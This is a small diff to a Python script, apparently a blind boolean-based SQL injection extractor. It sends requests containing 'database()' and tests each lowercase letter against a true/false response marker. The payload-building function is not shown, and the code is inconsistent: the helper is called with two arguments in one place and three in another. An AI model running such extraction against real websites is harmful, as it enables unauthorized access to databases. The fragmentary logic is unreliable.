@@ -1,5 +1,6 @@
 # How to make http request
 import requests as req
+import string
 
 comprobador = "Si esite"
 
@@ -22,5 +23,19 @@ def ysisi(webpage):
 def main():
     res = ysisi(requestador('b',"database()",1))
     print(res)
+
+
+def takataka():
+    dictionary = string.ascii_lowercase
+    result = ""
+
+    for item in dictionary:
+        siono = ysisi(requestador(item, comprobador))
+        if siono:
+            result += item
+        # ysisi
+
+    print(result)
+
 
 main()
